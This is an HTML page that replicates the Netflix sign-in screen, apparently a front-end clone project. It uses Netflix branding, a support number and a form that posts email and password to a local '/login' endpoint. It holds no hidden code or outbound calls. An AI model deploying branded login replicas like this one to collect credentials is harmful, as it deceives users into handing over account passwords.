<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="description" content="Netflix Login">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="sign_in.css">
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20,400,0,0" />
  <title>Netflix</title>
  <link rel="icon" href="https://cdn4.iconfinder.com/data/icons/logos-and-brands/512/227_Netflix_logo-1024.png">
</head>
<body>
  <div class="hero__bg">
    <div class="hero__bg__overlay"></div>
    <nav class="navbar">
      <div class="navbar__brand">
        <img width="100" height="100" src="https://pngshare.com/wp-content/uploads/2021/06/Netflix-Logo-Transparent-PNG-4-1024x317.png" alt="logo" class="brand__logo">
      </div>
    </nav>
    <div class="signin-container">
      <div class="signin-form">
        <h1 data-translate="sign_in">Sign In</h1>
        <form action="/login" method="post">
          <div class="input-group">
            <input type="text" id="email" name="email" required>
            <label data-translate="email_address_mobile">Email or mobile number</label>
          </div>
          <div class="input-group">
            <input type="password" id="password" name="password" required>
            <label data-translate="password">Password</label>
          </div>
          <button type="submit" class="signin-button" data-translate="sign_in">Sign In</button>
          <div class="or" data-translate="or">OR</div>
          <button type="submit" class="signin-code" data-translate="sign_in_code">Use a sign-in code</button>
          <div class="signin-options">
            <a href="/forgot-password" data-translate="forgot_pass">Forgot password?</a>
            <label>
              <input type="checkbox" checked name="remember"><span data-translate="remember_me">Remember me</span>
            </label>
          </div>
        </form>
      </div>
    </div>
  </div>
  <div class="footer-container">
    <div class="signup-link">
      <span data-translate="new_to_netflix">New to Netflix?</span><a href="Netflix.html" data-translate="sign_up">Sign up now</a>.
    </div>
    <div class="captcha-notice">
    <span data-translate="captcha">This page is protected by Google reCAPTCHA to ensure you're not a bot.</span><a href="#" data-translate="l_m">Learn more.</a>
    </div>
    <footer>
      <div class="footer-links">
        <div class="question">
          <span data-translate="question">Questions? Call</span><a href="" data-translate="call">000-800-919-1694</a>
        </div>
        <div class="link-row-1">
          <a href="" data-translate="faqs">FAQ</a>
          <a href="" data-translate="help_centre">Help Centre</a>
          <a href="" data-translate="terms_of_use">Terms of Use</a>
          <a href="" data-translate="privacy">Privacy</a>
        </div>
        <div class="link-row-2">
          <a href="" data-translate="cookie_preferences">Cookie Preferences</a>
          <a href="" data-translate="corporate_information">Corporate Information</a>
        </div>
        <div class="language-selector">
          <div class="dropdown__container">
            <svg xmlns="http://www.w3.org/2000/svg" height="16px" viewBox="0 -960 960 960" width="16px" fill="#FFFFFF">
              <path d="m488-96 171-456h82L912-96h-79l-41-117H608L567-96h-79ZM169-216l-50-51 192-190q-36-38-67-79t-54-89h82q18 32 36 54.5t52 60.5q38-42 70-87.5t52-98.5H48v-72h276v-96h72v96h276v72H558q-21 69-61 127.5T409-457l91 90-28 74-112-112-191 189Zm463-63h136l-66-189-70 189Z"/>
            </svg>
            <select name="languages" id="languagesSelect" class="language__drop__down">
              <option value="english" selected>English</option>
              <option value="hindi">हिन्दी</option>
            </select>
          </div>
        </div>
      </div>
    </footer>
  </div>
  <script src="index.js"></script>
</body>
